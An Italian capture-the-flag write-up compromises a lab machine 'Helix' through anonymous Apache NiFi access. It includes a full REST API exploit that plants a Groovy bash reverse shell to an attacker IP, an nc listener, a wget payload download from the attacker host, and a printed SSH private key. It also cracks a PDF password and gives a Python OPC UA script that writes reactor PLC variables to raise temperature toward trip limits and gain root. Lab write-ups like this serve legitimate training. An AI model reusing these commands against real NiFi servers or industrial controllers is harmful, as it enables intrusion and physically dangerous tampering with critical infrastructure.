IP vittima: 10.129.245.123
IP attaccante: 10.10.14.241
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.245.123`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 14:31 CEST
Initiating SYN Stealth Scan at 14:31
Scanning 10.129.245.123 [65535 ports]
Discovered open port 22/tcp on 10.129.245.123
Discovered open port 80/tcp on 10.129.245.123
Completed SYN Stealth Scan at 14:31, 12.05s elapsed (65535 total ports)
Nmap scan report for 10.129.245.123
Host is up, received user-set (0.059s latency).
Scanned at 2026-06-06 14:31:00 CEST for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
           Raw packets sent: 66031 (2.905MB) | Rcvd: 65576 (2.623MB)
```
`sudo nmap -sC -sV -p22,80 10.129.245.123`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 14:32 CEST
Nmap scan report for helix.htb (10.129.245.123)
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Helix Industries | Industrial Automation & Critical Infrastruc...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
```
Porte aperte:
- **22** — OpenSSH 8.9p1 Ubuntu
- **80** — nginx 1.18.0, hostname `helix.htb`

`ffuf -u http://helix.htb -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helix.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.helix.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1005ms]
:: Progress: [4989/4989] :: Job [1/1] :: 282 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
Trovato il sottodominio **flow.helix.htb** su cui è presente **Apache NiFi** versione **1.21.0**
## Apache NiFi 1.21.0 - Foothold
### Cos'è Apache NiFi
Apache NiFi è un sistema di **data flow automation** — permette di costruire pipeline di dati trascinando componenti visivi chiamati **processor**. Tra questi processor ce ne sono alcuni che eseguono codice arbitrario, come `ExecuteScript`.
#### Il problema: accesso anonimo con permessi di amministratore
NiFi supporta diverse modalità di autenticazione. In questo caso è configurato così:

```json
{"config": {"supportsLogin": false}}
```

Questo significa che **non è richiesta alcuna autenticazione**. Ogni richiesta viene trattata come se provenisse dall'utente `anonymous`.
Il secondo problema è che all'utente `anonymous` sono stati assegnati **tutti i permessi**, incluso il permesso critico:

```json
"execute-code": {
  "canRead": true,
  "canWrite": true
}
```
#### Come porta a RCE
NiFi espone una **REST API** completa che permette di fare tutto quello che si può fare dall'interfaccia grafica. Tra le operazioni disponibili c'è la creazione di processor.

Il processor `ExecuteScript` permette di eseguire codice in diversi linguaggi (Groovy, Python, Ruby, ecc.) direttamente sul sistema operativo dove gira NiFi. Combinando le due cose:

1. Chiunque può chiamare la REST API senza autenticarsi
2. Chiunque può creare un processor `ExecuteScript`
3. Il codice viene eseguito con i privilegi dell'utente di sistema che esegue NiFi (`nifi`)
### Apache NiFi — Accesso Anonimo
`http://flow.helix.htb` ospita **Apache NiFi 1.21.0**. L'API conferma l'accesso anonimo con permessi completi:
``` bash
curl -s http://flow.helix.htb/nifi-api/access/config
# {"config":{"supportsLogin":false}}

curl -s http://flow.helix.htb/nifi-api/flow/current-user | python3 -m json.tool
# "anonymous": true, execute-code canWrite: true
```
### RCE tramite ExecuteScript

#### Passo 1 — Ottieni il root process group ID:
```bash
curl -s http://flow.helix.htb/nifi-api/flow/process-groups/root \
  | python3 -m json.tool | grep '"id"' | head -1
# "id": "f203bc07-019b-1000-516b-eaedd48609d1",
```
Salva questo ID come `<ROOT_PG_ID>`.
#### Passo 2 — Avvia il listener (terminale separato):
```bash
nc -lvnp 4444
```
#### Passo 3 — Crea il processor ExecuteScript:
```bash
curl -s -X POST http://flow.helix.htb/nifi-api/process-groups/<ROOT_PG_ID>/processors \
  -H "Content-Type: application/json" \
  -d '{
    "revision": {"version": 0},
    "component": {
      "type": "org.apache.nifi.processors.script.ExecuteScript",
      "name": "pwn",
      "position": {"x": 100, "y": 100},
      "config": {
        "schedulingStrategy": "TIMER_DRIVEN",
        "properties": {
          "Script Engine": "Groovy",
          "Script Body": "def cmd = [\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/10.10.14.241/4444 0>&1\"].execute()"
        },
        "autoTerminatedRelationships": ["success","failure"]
      }
    }
  }' | python3 -m json.tool | grep '"id"' | head -1
# "id": "9cfb0d7b-019e-1000-b478-4ca38d3a83a7",
```
Salva l'ID restituito come `<PROC_ID>`.

> **Note:** L'engine deve essere `Groovy` (G maiuscola) e le relationships `success`/`failure` devono essere auto-terminate, altrimenti il processor resta in stato INVALID e non parte.
#### Passo 4 — Avvia il processor:
```bash
curl -s -X PUT http://flow.helix.htb/nifi-api/processors/<PROC_ID>/run-status \
  -H "Content-Type: application/json" \
  -d '{"revision": {"version": 1}, "state": "RUNNING"}'
```
La reverse shell arriva sul listener come utente `nifi`.
## Lateral movement
Otteniamo una shell come utente **nifi**
```
nifi@helix:/opt/nifi-1.21.0$ whoami
nifi
nifi@helix:/opt/nifi-1.21.0$ id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```
Scarichiamo [[linpeas]]sulla macchina vittima:
``` bash
# attaccante: nella cartella che contiene linpeas avviamo un server python
python -m http.server 8888

#vittima: scarichiamo linpeas
wget http://10.10.14.241:8888/linpeas.sh
```
Nei risultati di [[linpeas]]troviamo una possibile chiave SSH privata dell'user **operator**:
``` bash
╔══════════╣ Analyzing SSH Files (limit 70)
...
-rw-r--r-- 1 root root 97 Jan 24 20:31 /etc/ssh/ssh_host_ed25519_key.pub # non leggibile

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200) (T1574.009,T1574.010)
...
-rw-r----- 1 nifi nifi 411 Jan 25 13:15 /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak # leggibile

╔══════════╣ Backup files (limited 100) (T1552.001)
...
-rw-r----- 1 nifi nifi 411 Jan 25 13:15 /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak # leggibile
```
``` bash
cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY----
```
## User flag
Loggiamo con l'utente **operator** e la chiave ssh trovata:
``` bash
# Salva la chiave
cat > /tmp/operator_id_ed25519 << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
EOF

# Imposta i permessi corretti
chmod 600 /tmp/operator_id_ed25519

# Connettiti
ssh -i /tmp/operator_id_ed25519 operator@10.129.245.123
```
nella cartella **/home/operator** troviamo la user flag.
## Privilege Escalation
#### Script eseguibile come root senza password
Con `sudo -l` troviamo
```
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```
**operator** può eseguire `/usr/local/sbin/helix-maint-console` come root senza password.
 Questo è il codice dello script:
``` bash
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```
Il file è uno script bash di poche righe, legge il contenuto del file `/opt/helix/state/maintenance_window` e, se contiene un timestamp Unix futuro, lancia una shell root interattiva tramite `systemd-run`. Se il file non esiste o il timestamp è passato, termina con `Maintenance window CLOSED`.
**Obiettivo:** creare (o far creare al sistema) il file `/opt/helix/state/maintenance_window` con un timestamp valido.
La directory `/opt/helix/state/` non è accessibile in scrittura a `operator`, quindi bisogna trovare un altro modo per creare il timestamp. 
interagire con il PLC che gestisce il reattore per attivare la "finestra di manutenzione".
#### File PDF - Immagine PNG
Nella directory `/home/operator` è presente il file **Operator Control & Safety Guide.pdf** e l'immagine **control systems diagram.png**. Le scarichiamo sulla nostra macchina.
L'immagine ci dice che il reattore è controllato attraverso l'host locale **127.0.0.1:4840/helix/**
![[Pasted image 20260606165650.png]]
Il file pdf è bloccato da password (cifrato con AES-256). Crackiamo la password con [[johntheripper]]
``` bash
pdf2john "Operator Control & Safety Guide.pdf" > pdf_hash.txt

john pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
John trova la password **operator1**
```
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (Operator Control & Safety Guide.pdf)     
1g 0:00:00:32 DONE (2026-06-06 17:32) 0.03052g/s 8064p/s 8064c/s 8064C/s orphee..nsyncrox
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```
Visualizziamo il contenuto del file:
```
qpdf --password="operator1" --decrypt "Operator Control & Safety Guide.pdf" decrypted.pdf
pdftotext decrypted.pdf -
```
Questo il contenuto:
```
Helix Industries
Reactor Operations & Safety Logic – Operator Guide
Document Type: Internal Operator Reference
Audience: Control Room Operators / Maintenance Operators
System: Helix Reactor Control System (OPC UA–based PLC)

1. Overview
This document describes the normal operational behavior, safety mechanisms, and maintenance
control logic of the Helix Reactor system. It is intended to help operators understand:
• How reactor temperature and pressure evolve during operation
• How safety trips are triggered and latched
• Under which conditions a trip can be reset
• How the maintenance operating window is reached safely
The system is designed so that safety always has priority over operator control.

2. Core Reactor Variables
The following variables are continuously monitored and enforced by the PLC:

Reactor Process Variables
• Temperature – Current reactor temperature (°C)
• Pressure – Current reactor pressure (bar)
• CalibrationOffset – Maintenance-only adjustment applied to sensor calibration
CalibrationOffset does not directly control temperature or pressure. Instead, it introduces
a controlled bias used during diagnostics and maintenance.

Safety Variables
• TripActive – Indicates that the reactor has entered a safety shutdown state
• RodsInserted – Status of safety rods (controlled automatically)
• EmergencyCooling – Emergency cooling system status (automatic)

Control Variables
• Mode – Reactor operating mode ( NORMAL / MAINTENANCE )
• TestOverride – Enables limited maintenance overrides
• ResetTrip – Operator request to clear a safety trip

1


3. Normal Operating Mode
In NORMAL mode:
• CalibrationOffset is expected to be 0.0
• TestOverride must be disabled
• Reactor behavior follows standard control curves
Any attempt to apply calibration offsets or overrides in NORMAL mode is ignored by the PLC.

4. Safety Trip Logic
A safety trip is automatically triggered when reactor conditions exceed hard safety limits:

Trip Thresholds (Internal)
• Temperature ≥ \~305°C
• Pressure ≥ \~75 bar
When a trip occurs:
• TripActive becomes TRUE
• Control logic is locked
• Safety systems take precedence
• Operator inputs are restricted
Once triggered, a trip is latched and cannot be cleared immediately.

5. Trip Reset Conditions
A safety trip cannot be reset arbitrarily.
The PLC will only accept a reset if all of the following conditions are met:
• Reactor temperature is below \~288°C
• Reactor pressure is below \~70 bar
• Operating mode is NORMAL
• TestOverride is disabled
• CalibrationOffset is reset to 0.0
Only when the system is back in a verified safe state will a ResetTrip request be honored.
This ensures that operators cannot bypass safety systems while unsafe conditions persist.

2


6. Maintenance Mode & Safety Window
Entering Maintenance Mode
Maintenance operations require explicit operator action:
7. Switch Mode to MAINTENANCE
8. Enable TestOverride
9. Begin controlled adjustment using CalibrationOffset
In this mode, the reactor is still protected by safety logic, but limited overrides are permitted for
diagnostics.

10. Maintenance Operating Window
The PLC defines a maintenance operating window where certain diagnostic tools become available.
This window opens when:
• Temperature reaches approximately **295°C OR Pressure 73 bar
• Pressure & Temp remains below trip thresholds
• No safety trip is active
This window exists below trip limits but above normal operating conditions.
The window is intentionally narrow to ensure maintenance actions are time-limited and
closely monitored.

8. Behavior During CalibrationOffset Ramp
When CalibrationOffset is increased gradually:
• Temperature rises predictably
• Pressure increases slowly and remains tightly constrained
• Safety logic continuously monitors trip thresholds
If the offset is increased too aggressively:
• The PLC will trigger a safety trip
• CalibrationOffset changes are immediately ignored
Operators are expected to ramp offsets slowly and observe system feedback.

3


9. Why Safety Cannot Be Bypassed
The Helix control system is designed so that:
• Safety variables cannot be directly overridden by operators
• ResetTrip does not force-clear a trip
• Safety logic is evaluated server-side by the PLC
This prevents:
• Accidental unsafe operation
• Malicious misuse of control variables
• Human error during maintenance

10. Summary
• Trips protect the reactor and are always enforced
• ResetTrip only works when the reactor is genuinely safe
• Maintenance mode allows controlled diagnostics, not full bypass
• The safety window enables limited access without disabling protections
Operators are expected to follow these procedures strictly. Any deviation is logged and audited by the
control system.

Helix Industries – Safety First. Always.

4
```

#### Riepilogo
Quindi, nell'ordine, sappiamo:
**1. Il punto di partenza: `sudo -l`**
Il primo comando dopo aver preso la user è stato:
`sudo -l`
Risultato: `(root) NOPASSWD: /usr/local/sbin/helix-maint-console`
Questo ci ha detto che **potevamo diventare root** eseguendo quel binario. L’unico ostacolo era capire cosa facesse e come farlo funzionare.

**2. Ispezione del binario privilegiato**
`cat /usr/local/sbin/helix-maint-console`
Era un semplice script bash che:
1. Controlla se esiste il file **`/opt/helix/state/maintenance_window`**
2. Se esiste, legge un timestamp Unix al suo interno
3. Se il timestamp è nel futuro, esegue **`systemd-run /bin/bash -p -i`** come root
4. Altrimenti stampa `Maintenance window CLOSED` ed esce

Quindi l’obiettivo divenne: **creare o far creare quel file con un timestamp valido**.
La directory `/opt/helix/state/` era protetta (nessun permesso per `operator`), quindi non potevamo scriverlo direttamente. Doveva essere il sistema a generarlo.

**3. Il PDF e il contesto "reattore"**
Nella home di `operator` c’era un PDF: _Reactor Operations & Safety Logic – Operator Guide_. Parlava di un sistema di controllo reattore con variabili come `Mode`, `TestOverride`, `CalibrationOffset`, e descriveva una **"Maintenance Operating Window"** che si apre quando la temperatura raggiunge circa 295°C (o la pressione 73 bar) rimanendo sotto i limiti di trip (305°C, 75 bar), con `Mode=MAINTENANCE` e `TestOverride` attivo.
Il nome del file (`maintenance_window`) e il concetto di "finestra di manutenzione" coincidevano perfettamente. Deduzione: **il PLC del reattore crea quel file quando le condizioni di manutenzione sono soddisfatte**.

**4. Scoperta del PLC OPC-UA**
l'immagine **control systems diagram.png** ci dice che il reattore è controllato attraverso l'host locale **127.0.0.1:4840/helix/**
La porta 4840 è la porta standard del protocollo **OPC UA** (OPC Unified Architecture, assegnata da IANA, come la 80 è per HTTP o la 443 per HTTPS). Si tratta del protocollo standard per la comunicazione tra sistemi di controllo industriale (PLC, SCADA, HMI), è uno standard del settore

`ss -tlnp | grep 4840   # → 127.0.0.1:4840`

Abbiamo trovato l’interfaccia per parlare al reattore.

**5. Manipolazione delle variabili OPC UA**
Con la libreria `asyncua` (già installata sulla macchina) abbiamo esplorato l’albero dei nodi e trovato esattamente le variabili descritte nel PDF:
- `Control/Mode` → NORMAL o MAINTENANCE
- `Control/TestOverride` → booleano
- `Reactor/CalibrationOffset` → double
- `Reactor/Temperature` e `Reactor/Pressure` → **read-only**

La temperatura non poteva essere scritta direttamente (dava `BadUserAccessDenied`). L’unico modo per alzarla era usare `CalibrationOffset`, ma questo funziona solo se `Mode=MAINTENANCE` e `TestOverride=True`.

Quindi abbiamo scritto un semplice script Python che:
1. Imposta `Mode = "MAINTENANCE"`
2. Imposta `TestOverride = True`
3. Imposta `CalibrationOffset = 11.0` (valore scoperto empiricamente per portare la temperatura a ~295°C senza superare i 305°C del trip)

**6. La connessione finale**
Appena il PLC ha ricevuto quei valori, ha rilevato che la temperatura era entrata nella finestra di manutenzione e **ha creato automaticamente il file `/opt/helix/state/maintenance_window`** con un timestamp futuro.
`sudo /usr/local/sbin/helix-maint-console`
Ha trovato il file, letto il timestamp valido, e lanciato la shell root.

**In sintesi, il collegamento è stato:**
```
sudo -l

helix-maint-console → vuole il file maintenance_window

PDF → descrive la finestra di manutenzione del reattore

systemd → il reattore è un PLC OPC-UA (porta 4840)

OPC UA → possiamo manipolare Mode, TestOverride e CalibrationOffset

Condizioni raggiunte → il PLC crea il file

helix-maint-console → shell root
```
Ogni passaggio era un indizio lasciato nella macchina. Il PDF spiegava **cosa** fare, i servizi systemd indicavano **dove** farlo, e `sudo -l` mostrava il **premio** finale.
#### Manipolazione delle variabili OPC UA
Secondo il PDF, la finestra di manutenzione si apre quando:
- Mode = MAINTENANCE, TestOverride = True, CalibrationOffset in rampa
- Temperatura ≥ ~295°C **oppure** Pressione ≥ ~73 bar
- Temperatura < 305°C e Pressione < 75 bar (limiti di trip)
- Nessun trip attivo

Aumentando gradualmente `CalibrationOffset`, la temperatura sale lentamente. Con offset **11.0** si raggiungono circa 295°C senza superare i 305°C, aprendo la finestra.

Abbiamo la necessità di scrivere degli script ma il disco appare pieno. Con il comando `df -h /tmp /dev/shm` vediamo che c'è spazio in `/dev/shm`
```
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  6.6G  6.6G     0 100% /
tmpfs                              1.9G     0  1.9G   0% /dev/shm
```
Quindi scriveremo lì gli script.
#### Script trigger.py
Questo script genera le condizioni per la creazione del timestamp nella cartella `/opt/helix/state/maintenance_window` e quindi l'apertura della finestra di manutenzione che non è altro che una shell con privilegi root:
``` python
import asyncio
from asyncua import Client, ua

async def main():
    c = Client(url="opc.tcp://127.0.0.1:4840/")
    await c.connect()
    root = c.get_root_node()

    # Cerca ricorsivamente una variabile per nome (case‑insensitive)
    async def find_var(node, name):
        for child in await node.get_children():
            child_name = (await child.read_browse_name()).Name
            if (await child.read_node_class()).name == "Variable" and child_name.lower() == name.lower():
                return child
            found = await find_var(child, name)
            if found:
                return found
        return None

    mode = await find_var(root, "Mode")
    override = await find_var(root, "TestOverride")
    offset = await find_var(root, "CalibrationOffset")

    if not all([mode, override, offset]):
        print("Nodi non trovati! Verifica che il PLC sia acceso.")
        await c.disconnect()
        return

    # Imposta i valori per la finestra di manutenzione
    await mode.write_value(ua.Variant("MAINTENANCE", ua.VariantType.String))
    await override.write_value(ua.Variant(True, ua.VariantType.Boolean))
    await offset.write_value(ua.Variant(11.0, ua.VariantType.Double))

    print("Variabili impostate. Ora esegui:")
    print("sudo /usr/local/sbin/helix-maint-console")
    await c.disconnect()

asyncio.run(main())
```
Una volta che lo script si è concluso occorre lanciare lo script con privilegi sudo senza password per generare la shell root.
```
sudo /usr/local/sbin/helix-maint-console
```
Nella cartella `/root` troveremo la flag root.
#### Spiegazione dello script
##### 1. Importazione delle librerie

``` python
import asyncio
from asyncua import Client, ua
```

- **`asyncio`**: modulo Python per la programmazione asincrona. `asyncua` è una libreria asincrona, quindi tutte le chiamate al PLC (connessione, lettura, scrittura) devono essere eseguite con `await` all’interno di funzioni `async`.
- **`Client`**: classe principale per creare un client OPC‑UA. La useremo per connetterci al server (PLC).
- **`ua`**: modulo che contiene tipi di dato OPC‑UA, come `ua.Variant` (un valore associato al tipo) e `ua.VariantType` (Boolean, String, Double, ecc.).
##### 2. Definizione della funzione `main()` asincrona

``` python 
async def main():
  # tutto il codice...
```
La funzione `main()` è dichiarata `async`: al suo interno possiamo usare `await` per eseguire operazioni di I/O (rete) senza bloccare il programma.
##### 3. Connessione al PLC

``` python
c = Client(url="opc.tcp://127.0.0.1:4840/")
await c.connect()
```

- **`Client(url=...)`**: crea un client OPC‑UA puntando all’URL del server sul localhost, porta 4840 (porta standard OPC‑UA).
- **`await c.connect()`**: apre la connessione TCP e negozia il protocollo OPC‑UA. Dopo questa chiamata siamo connessi al PLC e possiamo leggere/scrivere variabili.
##### 4. Ottenere il nodo radice

``` python
root = c.get_root_node()
```

Il server OPC‑UA espone un nodo radice (sempre con identificatore `i=84`). Da qui possiamo esplorare l’intero albero dei nodi (cartelle, variabili, metodi, ecc.). `root` è il punto di partenza per la ricerca.
##### 5. Funzione di ricerca ricorsiva `find_var`

``` python
async def find_var(node, name):
    for child in await node.get_children():
        child_name = (await child.read_browse_name()).Name
        if (await child.read_node_class()).name == "Variable" and child_name.lower() == name.lower():
            return child
        found = await find_var(child, name)
        if found:
            return found
    return None
```

**Come funziona questa funzione**:
- **Input**: `node` (il nodo da cui partire) e `name` (la stringa da cercare).
- **`await node.get_children()`**: recupera la lista di tutti i nodi figli di `node`.
- **`await child.read_browse_name()`**: ottiene il nome simbolico del figlio (es. `"Reactor"`, `"Mode"`, `"Temperature"`). Prendiamo solo il campo `.Name`.
- **`await child.read_node_class()`**: restituisce la classe del nodo. Ci interessano solo i nodi di classe **`Variable`**, cioè variabili che possiedono un valore.
- **Condizione di match**: se la classe è `Variable` **e** il nome corrisponde (ignorando maiuscole/minuscole grazie a `.lower()`), il nodo viene restituito immediatamente.
- **Ricorsione**: se il nodo corrente non corrisponde, viene chiamata `find_var` sullo stesso `child`. Questo permette di scendere in profondità nell’albero.
- **Ritorno `None`**: se né il nodo né alcuno dei suoi discendenti corrisponde, restituisce `None`.

In pratica, questa funzione **setaccia l’intero albero** OPC‑UA fino a trovare la variabile desiderata, senza dover sapere dove si trova esattamente.
##### 6. Ricerca dei tre nodi necessari

``` python
mode = await find_var(root, "Mode")
override = await find_var(root, "TestOverride")
offset = await find_var(root, "CalibrationOffset")
```

- Cerchiamo i nodi variabili di nome `Mode`, `TestOverride` e `CalibrationOffset`.
- Poiché la ricerca parte dal `root`, copre l’intero spazio di nodi, qualunque sia la struttura interna del PLC.
##### 7. Controllo di successo della ricerca

``` python
if not all([mode, override, offset]):
    print("Nodi non trovati! Verifica che il PLC sia acceso.")
    await c.disconnect()
    return
```

- **`all([...])`** restituisce `True` solo se **tutti** i nodi sono stati trovati (cioè nessuno è `None`).
- Se manca anche un solo nodo, stampa un messaggio di errore, chiude la connessione e termina la funzione. Questo impedisce errori successivi quando si tenterà di scrivere un valore su un nodo inesistente.
##### 8. Impostazione dei valori per la finestra di manutenzione

``` python
await mode.write_value(ua.Variant("MAINTENANCE", ua.VariantType.String))
await override.write_value(ua.Variant(True, ua.VariantType.Boolean))
await offset.write_value(ua.Variant(11.0, ua.VariantType.Double))
```

- **`write_value`**: scrive un nuovo valore nel nodo OPC‑UA.
- **`ua.Variant(valore, tipo)`**: incapsula il valore con il tipo OPC‑UA appropriato. È obbligatorio specificare il tipo perché il server PLC si aspetta un tipo esatto.
    - `"MAINTENANCE"` come stringa (`VariantType.String`)
    - `True` come booleano (`VariantType.Boolean`)
    - `11.0` come numero a virgola mobile (`VariantType.Double`)
- **Ordine di scrittura**: prima `Mode`, poi `TestOverride`, infine `CalibrationOffset`. Non è strettamente necessario scriverli in quest’ordine, ma è logico: la modalità MAINTENANCE e TestOverride devono essere attivi affinché l’offset sia accettato.
##### 9. Messaggio finale e chiusura connessione

``` python
print("Variabili impostate. Ora esegui:")
print("sudo /usr/local/sbin/helix-maint-console")
await c.disconnect()
```

- Informa l’utente che i valori sono stati scritti con successo.
- Ricorda il comando da eseguire per ottenere la shell root.
- **`await c.disconnect()`**: chiude la connessione OPC‑UA in modo pulito.
##### 10. Avvio dell’esecuzione asincrona

``` python
asyncio.run(main())
```

- **`asyncio.run`** è il punto di ingresso standard per eseguire una funzione asincrona. Avvia il loop degli eventi e chiama `main()`. Quando `main()` termina, il programma esce.
##### Cosa succede nel sistema dopo l’esecuzione?

1. Il PLC riceve i tre nuovi valori.
2. Rileva che:
    - `Mode` è `"MAINTENANCE"`
    - `TestOverride` è `True`
    - `CalibrationOffset` è `11.0`
3. Internamente il PLC calcola la temperatura come `temperatura_base + CalibrationOffset`. Con un offset di 11.0, la temperatura simulata sale da ~284°C a circa 295°C.
4. Poiché la temperatura ha raggiunto la soglia minima di 295°C **ma è ancora sotto la soglia di trip (305°C)**, e la pressione rimane inferiore a 75 bar, il PLC considera **aperta la finestra di manutenzione**.
5. Come azione automatica, il PLC (o un servizio systemd collegato) **scrive il file `/opt/helix/state/maintenance_window`** con un timestamp Unix futuro (ad esempio, `data_corrente + 3600`).
6. Quando esegui `sudo /usr/local/sbin/helix-maint-console`, lo script bash controlla quel file, vede che il timestamp è ancora valido e lancia una shell interattiva con i privilegi di root (`systemd-run /bin/bash -p -i`).
